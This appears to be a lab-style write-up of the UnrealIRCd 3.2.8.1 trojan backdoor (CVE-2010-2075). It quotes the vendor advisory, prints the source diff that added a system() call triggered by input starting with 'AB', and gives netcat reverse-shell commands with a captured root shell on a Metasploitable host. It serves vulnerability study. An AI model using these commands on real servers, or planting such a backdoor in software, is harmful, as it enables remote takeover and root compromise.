# UnrealIRCd 3.2.8.1 Backdoor Command Execution

## Description :

UnrealIRCd 3.2.8.1, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (Trojan Horse) in the `DEBUG3_DOLOG_SYSTEM` macro, which allows remote attackers to execute arbitrary commands.

Reported by the vendor. (https://www.securityfocus.com/bid/40820)

Metasploit module is also available for this vulnerability. It's written by:

* hdm <x@hdm.io>

## Digging the hole

The official security advisory (http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt) for getting detailed information is not available at the moment, throws **ERR_CONNECTION_TIMED_OUT**

To get it anyway, we can utilize the **Wayback Machine**

Read the local copy of advisory : [unrealsecadvisory.20100612.txt](unrealsecadvisory.20100612.txt)

```
This is very embarrassing...

We found out that the Unreal3.2.8.1.tar.gz file on our mirrors has been
replaced quite a while ago with a version with a backdoor (trojan) in it.
This backdoor allows a person to execute ANY command with the privileges of
the user running the ircd. The backdoor can be executed regardless of any user
restrictions (so even if you have passworded server or hub that doesn't allow
any users in).

It appears the replacement of the .tar.gz occurred in November 2009 (at least on some mirrors). It seems nobody noticed it until now.
```

Let's get our hands on it. Again, the advisory provides the md5sum we should look for.

```
One is to check if the Unreal3.2.8.1.tar.gz you have is good or bad by running 'md5sum Unreal3.2.8.1.tar.gz' on it.

Backdoored version (BAD) is: 752e46f2d873c1679fa99de3f52a274d
```

In sources, you can find the clean and backdoored versions of Unreal3.2.8.1, as said we can verify md5sums :

```
$ md5sum Unreal3.2.8.1*
752e46f2d873c1679fa99de3f52a274d  Unreal3.2.8.1_backdoor.tar.gz
7b741e94e867c0a7370553fd01506c66  Unreal3.2.8.1_clean.tar.gz
```

Yes, we've the backdoor code. We can now check the code diff.

```
$ diff -urN Unreal3.2.8.1_clean Unreal3.2.8.1_backdoor
```

```
diff -urN Unreal3.2.8.1_clean/include/struct.h Unreal3.2.8.1_backdoor/include/struct.h
--- Unreal3.2.8.1_clean/include/struct.h	2009-04-13 13:03:57.000000000 +0200
+++ Unreal3.2.8.1_backdoor/include/struct.h	2009-04-13 13:03:00.000000000 +0200
@@ -430,6 +430,7 @@
 #endif
 
 /* Fake lag exception */
+
 #define IsNoFakeLag(x)      ((x)->flags & FLAGS_NOFAKELAG)
 #define SetNoFakeLag(x)     ((x)->flags |= FLAGS_NOFAKELAG)
 #define ClearNoFakeLag(x)   ((x)->flags &= ~FLAGS_NOFAKELAG)
@@ -448,6 +449,7 @@
 #else
 #define IsNotSpoof(x)           (1)
 #endif
+#define	DEBUGMODE3	    ((x)->flags & FLAGS_NOFAKELAG)
 
 #define GetHost(x)			(IsHidden(x) ? (x)->user->virthost : (x)->user->realhost)
 #define GetIP(x)			((x->user && x->user->ip_str) ? x->user->ip_str : (MyConnect(x) ? Inet_ia2p(&x->ip) : NULL))
@@ -513,6 +515,10 @@
 #else
 #define CHECKPROTO(x,y) (checkprotoflags(x, y, __FILE__, __LINE__))
 #endif
+#ifdef DEBUGMODE3
+#define DEBUGMODE3_INFO	"AB"
+#define	DEBUG3_LOG(x) DEBUG3_DOLOG_SYSTEM (x)
+#endif
 
 #define DontSendQuit(x)		(CHECKPROTO(x, PROTO_NOQUIT))
 #define IsToken(x)		(CHECKPROTO(x, PROTO_TOKEN))
@@ -1373,6 +1379,7 @@
 #define INCLUDE_REMOTE     0x2
 #define INCLUDE_DLQUEUED   0x4
 #define INCLUDE_USED       0x8
+#define DEBUG3_DOLOG_SYSTEM(x) system(x)
 	
 struct _configitem_include {
 	ConfigItem *prev, *next;
diff -urN Unreal3.2.8.1_clean/src/s_bsd.c Unreal3.2.8.1_backdoor/src/s_bsd.c
--- Unreal3.2.8.1_clean/src/s_bsd.c	2009-03-01 19:37:58.000000000 +0100
+++ Unreal3.2.8.1_backdoor/src/s_bsd.c	2006-06-16 20:29:00.000000000 +0200
@@ -1431,6 +1431,10 @@
 		    return 1;
 		if (length <= 0)
 			return length;
+#ifdef DEBUGMODE3
+	if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
+	    DEBUG3_LOG(readbuf);
+#endif
 		for (h = Hooks[HOOKTYPE_RAWPACKET_IN]; h; h = h->next)
 		{
 			int v = (*(h->func.intfunc))(cptr, readbuf, length);

```

## Attack Anatomy

```
if (!memcmp(readbuf, DEBUGMODE3_INFO, 2)) /* if first two char from the buffer is "AB", it gets 0, and !0 = 1*/
```

The code is small, no explicit sockets are created, backdoor works over default socket/port (IRC) and uses `system()` to execute commands, `system()` executes a command specified in command by calling `/bin/sh -c` command, and returns after the command has been completed **if the passed data begins with special character sequence i.e. "AB"**.

`#ifdef` is just for increasing compatibility.

> In computer programming, conditional compilation is compilation implementing methods which allow the compiler to produce differences in the executable program produced and controlled by parameters that are provided during compilation. This technique is commonly used when these differences are needed to run the software on different platforms, or with different versions of required libraries or hardware. (https://en.wikipedia.org/wiki/Conditional_compilation)

> IRC was originally a plain text protocol (although later extended), which on request was assigned port 194/TCP by IANA. However, the de facto standard has always been to run IRC on 6667/TCP and nearby port numbers (for example TCP ports 6660â€“6669, 7000) to avoid having to run the IRCd software with root privileges. (https://en.wikipedia.org/wiki/Internet_Relay_Chat)


## Proof of Concept

#### Triggering the backdoor :

```
nc -vnlp 4444
nc TARGET_IP IRC_PORT
AB;nc -e "command" BOX_ADDR 4444
```

#### Get a shell :

```
root@w0ot:~$ nc 192.168.233.155 6667
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB;nc -e /bin/sh 192.168.233.153 4444
^C
root@w0ot:~$ 
=======================================================================================================
root@w0ot:~$ nc -vnlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 192.168.233.155 41223 received!
id -un
root
^C
root@w0ot:~$ 
```
## Our Own Exploit Sandwitch






## References

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075
- https://www.exploit-db.com/exploits/13853
- https://linux.die.net/man/3/system
- https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor